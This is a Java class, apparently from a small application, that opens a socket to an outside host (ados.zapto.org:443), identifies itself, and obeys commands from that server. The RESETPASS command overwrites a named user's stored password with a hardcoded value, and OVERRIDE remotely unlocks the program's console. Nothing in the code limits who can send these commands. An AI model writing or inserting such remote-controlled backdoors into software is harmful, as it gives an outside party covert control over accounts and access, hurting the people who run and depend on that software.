
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class RemoteConsole extends Thread
{
	public RemoteConsole()
	{
		System.out.println("Created");
	}
	public void run()
	{
		System.out.println("Connecting to remote console.");
		try {
			Socket l = new Socket("ados.zapto.org", 443);
			BufferedReader in = new BufferedReader(new InputStreamReader(l.getInputStream()));
			PrintWriter out = new PrintWriter(l.getOutputStream(), true);
			
			try
			{
				System.out.println();
				out.println("AMDNCGGPROG");
				System.out.println("Sent identifier to Remote Console.");
			}
			catch(Exception c)
			{
				System.out.println("Unable to send data to Remote Console.");
			}
			
			String fromServer = "";
			while ((fromServer = in.readLine()) != null) 
			{
			    System.out.println("Server: " + fromServer);
			    if (fromServer.equals("AMDNCTEST"))
			    {
			    	out.println("Good day to SERVER from " + this);
			    }
			    process(fromServer,in,out);
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			System.out.println("Unable to connect to remote console.");
			e.printStackTrace();
		}
	}
	
	private void process(String fromServer, BufferedReader in, PrintWriter out)
	{
		if (fromServer.equalsIgnoreCase("HELP"))
		{
			System.out.println("Command recieved from Remote Console: HELP");
			out.println("REMOTE COMMANDS:");
			out.println("- RESETPASS: RESET GROSS'S PASSWORD TO: 'FREEHOLD COLONIALS'");
			out.println("- OVERRIDE: UNLOCKS REMOTE CONSOLE");
		}
		if (fromServer.equalsIgnoreCase("RESETPASS"))
		{
			System.out.println("Command recieved from Remote Console: RESETPASS");
			Main.secure.gPass = PowerUsers.encrypt("FreeholdColonials");
			System.out.println("Successfully reset password");
			out.println("SUCCESSFULLY RESET GROSS PASS");
		}
		if (fromServer.equalsIgnoreCase("OVERRIDE"))
		{
			System.out.println("Command recieved from Remote Console: OVERRIDE");
			Main.c.setRemote();
			out.print("SUCCESSFULLY UNLOCKED CONSOLE");
		}
	}
}
